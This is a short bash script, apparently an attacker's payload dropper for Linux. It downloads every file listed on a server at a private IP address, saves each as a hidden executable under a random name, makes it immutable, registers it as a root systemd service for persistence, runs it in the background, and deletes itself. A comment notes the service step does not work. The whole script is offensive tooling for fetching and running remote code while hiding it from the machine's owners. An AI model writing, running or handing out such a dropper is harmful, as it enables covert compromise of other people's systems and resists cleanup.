#!/bin/bash

# Set the URL of the Python Simple HTTP server
URL="http://10.128.42.42/linux_payloads/"

# Download all files from the server and save them as hidden files with random alphanumeric names
wget -q -O- $URL | grep -o '<a href=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^<a href=["'"'"']//' -e 's/["'"'"']$//' | while read FILENAME
do
    # Generate a random alphanumeric filename for the hidden file
    NEWNAME=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
    # Download the file from the server and save it as a hidden file
    wget -q $URL/$FILENAME -O .$NEWNAME
    # Make the file executable
    chmod +x .$NEWNAME
    # Make the file immutable
    chattr +i .$NEWNAME
    # Create a system service to start the file at boot time (this is broken, not sure why)
    cat > /etc/systemd/system/$NEWNAME.service << EOF
[Unit]
Description=$NEWNAME

[Service]
ExecStart=/bin/bash "$PWD/.$NEWNAME"
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF
    # Reload the systemd daemon and enable the service
    systemctl daemon-reload
    systemctl enable $NEWNAME.service
    # since the startup service didnt work we do this chicanery
    nohup ./.$NEWNAME &
done

# Delete the script itself
rm $0
